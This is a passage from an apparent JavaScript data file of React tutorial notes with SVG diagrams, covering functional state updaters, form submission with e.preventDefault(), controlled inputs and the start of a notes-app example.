  setNum(prev => prev + 1);
};</code></pre>
                  </li>
                  <li>Now, the result is guaranteed to be <strong><code>3</code></strong>!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 26.2 · Functional Updater Queue: How prev Chaining Increments State</span>
                <span class="diagram-frame-tag">FUNCTIONAL QUEUE CHAIN</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Queue showing prev chaining from 10 to 11 to 12 to 13">
                  <!-- Start -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="160" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="80" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">INITIAL</text>
                    <text x="80" y="52" text-anchor="middle" class="svg-title">num = 10</text>
                    <rect x="15" y="66" width="130" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="80" y="105" text-anchor="middle" class="svg-mono-xs">Base State</text>
                  </g>

                  <line x1="195" y1="100" x2="225" y2="100" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="225,96 233,100 225,104" fill="var(--primary)"/>

                  <!-- Step 1 -->
                  <g transform="translate(240, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">QUEUE 1</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">prev =&gt; prev + 1</text>
                    <rect x="15" y="66" width="150" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="90" y="94" text-anchor="middle" class="svg-mono-xs">10 + 1</text>
                    <text x="90" y="114" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Passes: 11</text>
                  </g>

                  <line x1="430" y1="100" x2="460" y2="100" stroke="var(--accent)" stroke-width="2"/>
                  <polygon points="460,96 468,100 460,104" fill="var(--accent)"/>

                  <!-- Step 2 -->
                  <g transform="translate(475, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">QUEUE 2</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">prev =&gt; prev + 1</text>
                    <rect x="15" y="66" width="150" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="90" y="94" text-anchor="middle" class="svg-mono-xs">11 + 1</text>
                    <text x="90" y="114" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Passes: 12</text>
                  </g>

                  <line x1="665" y1="100" x2="695" y2="100" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="695,96 703,100 695,104" fill="var(--success)"/>

                  <!-- Step 3 Final -->
                  <g transform="translate(710, 25)">
                    <rect x="0" y="0" width="145" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="72" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">FINAL</text>
                    <text x="72" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">num = 13</text>
                    <rect x="10" y="66" width="125" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="72" y="94" text-anchor="middle" class="svg-mono-xs">12 + 1</text>
                    <text x="72" y="114" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Result: 13 ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "26.3",
          title: "State Update Queue Mechanics in the React Fiber Engine",
          content: `
            <p>
              How does React process functional updaters under the hood?
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Fiber Update Queue:</strong>
                <ul class="notes-sub-list">
                  <li>Inside the component's Fiber node, React maintains an <strong>Update Queue</strong>.</li>
                  <li>When you pass a function <code>prev =&gt; prev + 1</code>, React pushes the function onto this queue instead of resolving a static value.</li>
                  <li>During reconciliation, React processes the queue sequentially:
                    <br>&bull; Initial state: <code>0</code>
                    <br>&bull; Queue item 1: <code>0 =&gt; 0 + 1 = 1</code>
                    <br>&bull; Queue item 2: <code>1 =&gt; 1 + 1 = 2</code> (receives result of item 1!)
                    <br>&bull; Queue item 3: <code>2 =&gt; 2 + 1 = 3</code> (receives result of item 2!)
                    <br>&bull; Final committed state: <strong><code>3</code></strong> &check;
                  </li>
                </ul>
              </li>
              <li><strong>Production Engineering Best Practice:</strong>
                <ul class="notes-sub-list">
                  <li>Whenever your next state depends directly on the previous state (counters, toggling booleans, appending to arrays), <strong>always use the functional updater form</strong> (<code>setVal(prev =&gt; !prev)</code>). It guarantees mathematical accuracy and prevents stale state concurrency bugs!</li>
                </ul>
              </li>
            </ul>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 27
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-27-form-handling-prevent-default",
      number: "27",
      shortLabel: "Form Handling & preventDefault",
      title: "Form Handling in React (onSubmit & e.preventDefault())",
      summary: "Default HTML form POST behavior and page reload flaw, capturing submit events via onSubmit, and keeping the SPA alive with e.preventDefault().",
      subtopicLabels: ["27.1 Page Reload Problem", "27.2 e.preventDefault()", "27.3 Form Validation"],
      diagramCount: 2,
      sections: [
        {
          num: "27.1",
          title: "Default Form Submission Behavior (The Page Reload Problem)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Traditional Browser Form Submission Behavior:</strong>
                <ul class="notes-sub-list">
                  <li>In standard HTML, submitting a <code>&lt;form&gt;</code> instructs the browser to bundle all form inputs and trigger an HTTP request, resulting in a <strong>hard page reload</strong>.</li>
                  <li>In a Single Page Application (SPA) built with React, hard page reloads destroy the entire in-memory state tree and wipe the browser console in a fraction of a millisecond!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 27.1 · Default HTML Form Submission: Full Page Reload Flaw</span>
                <span class="diagram-frame-tag">BROWSER DEFAULT BEHAVIOR</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing default HTML form submission triggering full page reload and wiping SPA state">
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="189" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="109.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">DEFAULT BROWSER FORM ❌</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Hard Page Reload Triggered</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Browser refreshes the entire page</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• React in-memory state is wiped out!</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">• Console logs flash and disappear</text>
                  </g>

                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <rect x="15" y="15" width="150" height="20" rx="4" fill="var(--border)"/>
                    <text x="90" y="29" text-anchor="middle" class="svg-mono-xs">DESIRED SPA FLOW</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title">Single Page Preservation</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Keep browser on current page</text>
                    <text x="25" y="114" class="svg-mono-xs">• Process form inputs in JavaScript</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--success);">• Retain all existing component state</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "27.2",
          title: "Preventing Reload With e.preventDefault() (Exact Code)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Solution — <code>e.preventDefault()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Attach <code>onSubmit={(e) => submitHandler(e)}</code> directly onto the <code>&lt;form&gt;</code> tag.</li>
                  <li>In the first line of your handler function, call <strong><code>e.preventDefault()</code></strong>. This cancels the browser's default document reload while keeping your event listener active.</li>
                  <li><strong>Senior Gotcha:</strong> Ensure exact camelCase spelling: <code>e.preventDefault()</code>. A typo here causes the reload to slip through.</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React from 'react'

const App = () => {
  const submitHandler = (e) => {
    e.preventDefault()
    console.log('Form Submitted')
  }

  return (
    <div>
      <form onSubmit={(e) => {
        submitHandler(e)
      }}>
        <input type="text" placeholder="Enter your name" />
        <button>Submit</button>
      </form>
    </div>
  )
}

export default App</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 27.2 · React SPA Form Submission: Intercepting with e.preventDefault()</span>
                <span class="diagram-frame-tag">EVENT INTERCEPTION PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing e.preventDefault cancelling default navigation and processing data in React state">
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · SUBMIT EVENT</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">&lt;form onSubmit&gt;</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs">User clicks Submit</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-sub">SyntheticEvent dispatched</text>
                  </g>

                  <line x1="260" y1="100" x2="295" y2="100" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="295,96 303,100 295,104" fill="var(--primary)"/>

                  <g transform="translate(315, 25)">
                    <rect x="0" y="0" width="240" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2 · INTERCEPT</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">e.preventDefault()</text>
                    <rect x="15" y="66" width="210" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="120" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Cancels page reload</text>
                    <text x="120" y="114" text-anchor="middle" class="svg-sub">Keeps JavaScript heap alive</text>
                  </g>

                  <line x1="565" y1="100" x2="600" y2="100" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="600,96 608,100 600,104" fill="var(--success)"/>

                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">3 · CLIENT PROCESSING</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Seamless SPA Action</text>
                    <rect x="15" y="66" width="200" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="115" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Logs data & saves state</text>
                    <text x="115" y="114" text-anchor="middle" class="svg-sub">Zero page flicker ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "27.3",
          title: "Production Form Validation, FormData API & Keyboard Accessibility",
          content: `
            <p>
              Handling form submissions in professional web applications goes beyond calling <code>e.preventDefault()</code>. Production engineers follow strict patterns for accessibility, input validation, and double-submit prevention.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Keyboard Accessibility (<kbd>Enter</kbd> Key Submit):</strong>
                <ul class="notes-sub-list">
                  <li>Always attach your submit listener to <code>&lt;form onSubmit={handleSubmit}&gt;</code>, NEVER to the button's <code>onClick</code>.</li>
                  <li>Attaching to <code>&lt;form&gt;</code> ensures that pressing <kbd>Enter</kbd> inside any input field will naturally submit the form, which is critical for screen readers and keyboard-only users.</li>
                </ul>
              </li>
              <li><strong>Double-Submit Prevention (Debouncing & Disabled State):</strong>
                <ul class="notes-sub-list">
                  <li>Users frequently double-click or spam the submit button, which could trigger duplicate charges or duplicate database records.</li>
                  <li>Always declare an <code>isSubmitting</code> state flag: disable the submit button and show a spinner while the asynchronous request is pending!</li>
                </ul>
              </li>
              <li><strong>The Modern <code>FormData</code> Alternative:</strong>
                <ul class="notes-sub-list">
                  <li>For large forms where you don't need real-time per-keystroke validation, you can extract all form inputs cleanly on submission using the native <code>FormData</code> API:</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function ContactForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMsg, setStatusMsg] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setStatusMsg(null);

    // Extract all named inputs via native FormData API:
    const formData = new FormData(e.currentTarget);
    const payload = Object.fromEntries(formData.entries());

    // Defensive client-side validation
    if (!payload.email || !payload.email.includes('@')) {
      alert('Please enter a valid email address!');
      setIsSubmitting(false);
      return;
    }

    try {
      // Simulate API dispatch
      await new Promise(resolve => setTimeout(resolve, 1000));
      setStatusMsg('Thank you! Your message has been received.');
      e.target.reset(); // Native form field reset
    } catch (err) {
      setStatusMsg('Submission failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    &lt;form onSubmit={handleSubmit} className="p-6 max-w-md mx-auto bg-card border rounded-xl space-y-4"&gt;
      &lt;h3 className="text-lg font-bold"&gt;Contact Support&lt;/h3&gt;
      &lt;input 
        name="fullName" 
        type="text" 
        placeholder="Full Name" 
        required 
        className="w-full border p-2 rounded" 
      /&gt;
      &lt;input 
        name="email" 
        type="email" 
        placeholder="Email Address" 
        required 
        className="w-full border p-2 rounded" 
      /&gt;
      &lt;textarea 
        name="message" 
        placeholder="How can we help?" 
        required 
        rows={3} 
        className="w-full border p-2 rounded" 
      /&gt;
      &lt;button 
        type="submit" 
        disabled={isSubmitting}
        className="w-full py-2 bg-emerald-600 text-white rounded font-bold disabled:opacity-50 transition"
      &gt;
        {isSubmitting ? 'Sending Message...' : 'Submit Form'}
      &lt;/button&gt;
      {statusMsg && &lt;p className="text-sm font-semibold text-emerald-600"&gt;{statusMsg}&lt;/p&gt;}
    &lt;/form&gt;
  );
}

export default ContactForm;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 28: TWO-WAY BINDING IN REACT ("EK TEER SE DO NISHANE")
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-28-two-way-binding-controlled-inputs",
      number: "28",
      shortLabel: "Two-Way Binding & Controlled Inputs",
      title: "Two-Way Binding in React (Controlled Inputs: Value & onChange)",
      summary: "Controlled vs. uncontrolled inputs, establishing a single source of truth between React state and the DOM input element, and handling multi-input forms with computed keys.",
      subtopicLabels: ["28.1 Controlled Components", "28.2 Two-Way Binding Loop", "28.3 Dynamic Form Handlers"],
      diagramCount: 2,
      sections: [
        {
          num: "28.1",
          title: "Controlled vs. Uncontrolled Components (Single Source of Truth)",
          content: `
            <p>
              In traditional HTML forms, the physical DOM node manages its own internal state. When a user types into an <code>&lt;input&gt;</code>, the browser stores and displays that text directly inside the input element. This is known as an <strong>Uncontrolled Component</strong>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Uncontrolled Model & Its Limits:</strong>
                <ul class="notes-sub-list">
                  <li>In an uncontrolled setup, React has no knowledge of what the user is typing until the form is submitted and you read values via refs (<code>inputRef.current.value</code>).</li>
                  <li>You cannot implement instant validation, character countdowns, conditional disabled buttons, or input masking cleanly.</li>
                </ul>
              </li>
              <li><strong>The Controlled Component Architecture:</strong>
                <ul class="notes-sub-list">
                  <li>In a <strong>Controlled Component</strong>, the React state variable serves as the <strong>Single Source of Truth</strong>.</li>
                  <li>The DOM input element is stripped of its internal authority: its displayed text is driven 100% by React's <code>value</code> prop, and any attempt by the user to type is intercepted by <code>onChange</code> to update React state.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 28.1 · Controlled Component: The Bidirectional State Loop</span>
                <span class="diagram-frame-tag">BIDIRECTIONAL DATA BINDING</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing bidirectional data binding between React useState and input element">
                  <!-- React State Node -->
                  <g transform="translate(50, 40)">
                    <rect x="0" y="0" width="300" height="150" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="2"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">REACT STATE</text>
                    <text x="150" y="65" text-anchor="middle" class="svg-title">const [title, setTitle]</text>

                    <rect x="15" y="80" width="270" height="50" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="150" y="105" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">Single Source of Truth</text>
                    <text x="150" y="122" text-anchor="middle" class="svg-sub">Stores live input text</text>
                  </g>

                  <!-- Top Arrow: State to Input (value={title}) -->
                  <g transform="translate(365, 60)">
                    <line x1="0" y1="10" x2="140" y2="10" stroke="var(--primary)" stroke-width="2.5"/>
                    <polygon points="140,5 150,10 140,15" fill="var(--primary)"/>
                    <rect x="15" y="-14" width="120" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="75" y="0" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--primary); font-weight:700;">value={title}</text>
                  </g>

                  <!-- Bottom Arrow: Input to State (onChange) -->
                  <g transform="translate(365, 140)">
                    <line x1="150" y1="10" x2="10" y2="10" stroke="var(--accent)" stroke-width="2.5"/>
                    <polygon points="10,5 0,10 10,15" fill="var(--accent)"/>
                    <rect x="15" y="-14" width="120" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="75" y="0" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent); font-weight:700;">onChange={e =&gt; ...}</text>
                  </g>

                  <!-- DOM Input Node -->
                  <g transform="translate(530, 40)">
                    <rect x="0" y="0" width="300" height="150" rx="12" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="2"/>
                    <rect x="15" y="15" width="120" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="75" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">DOM ELEMENT</text>
                    <text x="150" y="65" text-anchor="middle" class="svg-title">&lt;input /&gt; on Page</text>

                    <rect x="15" y="80" width="270" height="50" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="150" y="105" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Controlled Component</text>
                    <text x="150" y="122" text-anchor="middle" class="svg-sub">Mirrors state in real time</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "28.2",
          title: "The Two-Way Binding Feedback Loop Mechanics",
          content: `
            <p>
              Two-way data binding in React is not automatic "magic" (like in AngularJS or Vue); it is an explicit, circular 2-step feedback pipeline:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Step 1 (View &rarr; State):</strong> The user presses a key on their keyboard. The browser fires an <code>input</code> event. React intercepts this via <code>onChange</code>, extracts <code>e.target.value</code>, and calls <code>setState(e.target.value)</code>.</li>
              <li><strong>Step 2 (State &rarr; View):</strong> React enqueues the state update, re-renders the component, and feeds the updated state string directly into the <code>value={state}</code> prop. The browser DOM element displays the text requested by React!</li>
              <li><strong>The "Read-Only" Trap:</strong> If you pass <code>value={name}</code> without an <code>onChange</code> handler, React will lock the input! You will press keys on your keyboard and literally nothing will appear on screen, because React continuously re-asserts the original state value. React will warn in the console: <code>Warning: You provided a 'value' prop to a form field without an 'onChange' handler.</code></li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function ControlledInput() {
  const [email, setEmail] = useState('');

  return (
    &lt;div className="p-4"&gt;
      &lt;label className="block text-xs font-semibold uppercase mb-1"&gt;User Email&lt;/label&gt;
      {/* Both value and onChange are strictly bound together */}
      &lt;input 
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Enter your email address"
        className="border px-3 py-2 rounded w-full focus:ring-2 focus:ring-emerald-500"
      /&gt;
      &lt;p className="mt-1 text-xs text-text-muted"&gt;
        Characters typed: {email.length}
      &lt;/p&gt;
    &lt;/div&gt;
  );
}

export default ControlledInput;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 28.2 · Controlled Input Lifecycle: Keystroke Event vs. Programmatic Clear</span>
                <span class="diagram-frame-tag">CONTROLLED COMPONENT EVENT LIFECYCLE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Controlled input lifecycle showing user typing triggering onChange to state and programmatic clear via setTitle empty string on submit">
                  <!-- Step 1: Keystroke to State -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="255" height="170" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="12" width="219" height="18" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="124.5" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">DIRECTION 1: INPUT → STATE</text>
                    <text x="127" y="50" text-anchor="middle" class="svg-title">User Keystroke</text>
                    <rect x="15" y="64" width="225" height="90" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="86" class="svg-mono-xs">1. User types in &lt;input /&gt;</text>
                    <text x="25" y="106" class="svg-mono-xs">2. Fires onChange={(e) =&gt; ...}</text>
                    <text x="25" y="126" class="svg-mono-xs">3. Calls setTitle(e.target.value)</text>
                    <text x="25" y="144" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">→ State updates immediately</text>
                  </g>

                  <!-- Arrow 1: To Controller -->
                  <line x1="280" y1="105" x2="305" y2="105" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="305,101 313,105 305,109" fill="var(--primary)"/>

                  <!-- Step 2: State Controls Input (Single Source of Truth) -->
                  <g transform="translate(315, 20)">
                    <rect x="0" y="0" width="255" height="170" rx="8" fill="var(--bg-surface)" stroke="var(--primary)" stroke-width="1.8"/>
                    <text x="127" y="26" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">SINGLE SOURCE OF TRUTH</text>
                    <text x="127" y="50" text-anchor="middle" class="svg-title">React State Controller</text>
                    <rect x="15" y="64" width="225" height="90" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
                    <text x="25" y="86" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">const [title, setTitle] = useState('')</text>
                    <text x="25" y="106" class="svg-mono-xs">&lt;input value={title} /&gt;</text>
                    <text x="25" y="126" class="svg-mono-xs">DOM input NEVER has own state</text>
                    <text x="25" y="144" class="svg-mono-xs" style="fill:var(--text-muted);">Input always reflects {title}</text>
                  </g>

                  <!-- Arrow 2: To Reset -->
                  <line x1="570" y1="105" x2="595" y2="105" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="595,101 603,105 595,109" fill="var(--success)"/>

                  <!-- Step 3: Programmatic Reset -->
                  <g transform="translate(605, 20)">
                    <rect x="0" y="0" width="250" height="170" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="12" width="167" height="18" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="98.5" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">FORM SUBMIT &amp; RESET</text>
                    <text x="125" y="50" text-anchor="middle" class="svg-title" style="fill:var(--success);">Auto-Reset Pattern</text>
                    <rect x="15" y="64" width="220" height="90" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="86" class="svg-mono-xs">submitHandler(e):</text>
                    <text x="25" y="106" class="svg-mono-xs">• e.preventDefault()</text>
                    <text x="25" y="126" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• setTitle('') // Resets State</text>
                    <text x="25" y="144" class="svg-mono-xs" style="fill:var(--success);">Input clears automatically! ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "28.3",
          title: "Dynamic Multi-Input Form Handling via Computed Property Names",
          content: `
            <p>
              What if your form has 10 different input fields? Creating 10 separate <code>useState</code> hooks (<code>name</code>, <code>email</code>, <code>phone</code>, <code>city</code>...) creates messy, repetitive boilerplate.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Senior Pattern — Unified Form Object State:</strong>
                <ul class="notes-sub-list">
                  <li>Store the entire form inside a single object state:
                    <pre class="notes-code-block"><code>const [formData, setFormData] = useState({
  fullName: '',
  email: '',
  role: 'Developer'
});</code></pre>
                  </li>
                  <li>Give each <code>&lt;input&gt;</code> a <code>name</code> attribute that matches the object key exactly:
                    <br><code>&lt;input name="fullName" value={formData.fullName} onChange={handleChange} /&gt;</code>
                  </li>
                  <li>Use ES6 <strong>Computed Property Names</strong> (<code>[e.target.name]</code>) in a single, reusable change handler:
                    <pre class="notes-code-block"><code>const handleChange = (e) => {
  const { name, value } = e.target;
  setFormData(prev => ({
    ...prev,
    [name]: value // Dynamically updates 'fullName', 'email', etc.
  }));
};</code></pre>
                  </li>
                </ul>
              </li>
            </ul>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 29
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-29-notes-app-state-setup-adding",
      number: "29",
      shortLabel: "Building Notes App — State Setup",
      title: "Building the Notes App — State Setup, Two-Way Binding & Adding Notes",
      summary: "Practical full-flow project architecture: separating form state from list state, handling submission validation, pure immutable array insertion, and resetting form inputs.",
      subtopicLabels: ["29.1 Notes State Setup", "29.2 Immutable Insertion", "29.3 Form Reset"],
      diagramCount: 2,
      sections: [
        {
          num: "29.1",
          title: "Architecture & Separation of Concerns (Form State vs. List State)",
          content: `
            <p>
              When building dynamic CRUD applications (like note-taking apps, task boards, or issue trackers), clean architecture starts with segregating <strong>transient input state</strong> from <strong>persisted list state</strong>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Two State Pillars:</strong>
                <ul class="notes-sub-list">
                  <li><strong>1. Transient Form State:</strong> Holds the raw, temporary values currently typed into the inputs (e.g. <code>title</code> and <code>content</code>). Once submitted, this data is transferred to the main collection and cleared.</li>
                  <li><strong>2. Collection List State:</strong> An array of structured note objects (e.g. <code>notes = [{ id, title, content, createdAt }]</code>) that persists throughout the user session and renders the cards grid.</li>
                </ul>
              </li>
              <li><strong>Why Keep Them Separate?</strong>
                <ul class="notes-sub-list">
                  <li>Separating them ensures that typing in an input field does not re-compute or mutate the historical notes list until the user explicitly commits the submission.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 29.1 · Notes App Architecture: Form State to Master Array Stream</span>
                <span class="diagram-frame-tag">APPLICATION STATE TOPOLOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing form inputs feeding into master task array and rendering sticky notes">
                  <!-- Left Form -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="380" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">LEFT: FORM PANEL</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Controlled Input State</text>

                    <rect x="15" y="74" width="350" height="40" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">title: "Revise React State"</text>

                    <rect x="15" y="122" width="350" height="40" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="146" class="svg-mono-xs">details: "Finish Topics 24 to 30"</text>
                  </g>

                  <!-- Down Arrow / Flow -->
                  <g transform="translate(415, 105)">
                    <line x1="0" y1="10" x2="45" y2="10" stroke="var(--success)" stroke-width="2.5"/>
                    <polygon points="45,5 55,10 45,15" fill="var(--success)"/>
                    <text x="22" y="-2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Appends</text>
                  </g>

                  <!-- Right Feed -->
                  <g transform="translate(480, 20)">
